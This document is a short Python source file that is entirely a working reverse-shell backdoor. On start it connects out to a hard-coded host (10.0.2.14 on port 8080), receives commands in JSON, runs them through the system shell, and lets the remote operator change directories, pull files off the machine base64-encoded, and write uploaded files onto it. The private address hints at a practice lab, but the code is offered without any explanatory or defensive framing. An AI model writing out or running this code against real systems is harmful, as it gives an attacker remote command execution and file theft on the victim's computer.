import socket
import subprocess
import simplejson
import os
import base64

class MySocket:
	def __init__(self,ip,port):
		self.my_connect = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		self.my_connect.connect((ip,port))

	def command_execution(self,command):
		return subprocess.check_output(command,shell=True)

	def json_send(self,data):
		json_data = simplejson.dumps(data)
		self.my_connect.send(json_data.encode("utf-8"))

	def json_receive(self):
		json_data = ""
		while True:
			try:
				json_data = json_data + self.my_connect.recv(1024).decode()
				return simplejson.loads(json_data)
			except ValueError:
				continue

	def execute_cd_command(self,directory):
		os.chdir(directory)
		return "Cd to" + directory

	def get_file_content(self,path):
		with open(path,"rb") as my_file:
			return base64.b64encode(my_file.read())

	def save_file(self,path,content):
		with open(path,"wb") as my_file:
			my_file.write(base64.b64decode(content))
			return "Upload OK"

	def start_connection(self):
		while True:
			command = self.json_receive()
			try:
				if command[0] == "quit":
					self.my_connect.close()
					exit()
				elif command[0] == "cd" and len(command) > 1:
					command_output = self.execute_cd_command(command[1])
				elif command[0] == "download":
					command_output = self.get_file_content(command[1])
				elif command[0] == "upload":
					command_output = self.save_file(path=command[1],content=command[2])
				else:
					command_output = self.command_execution(command)

			except Exception:
				command_output = "Error!"

			self.json_send(command_output)
		self.my_connect.close()

my_socket_object = MySocket("10.0.2.14",8080)
my_socket_object.start_connection()
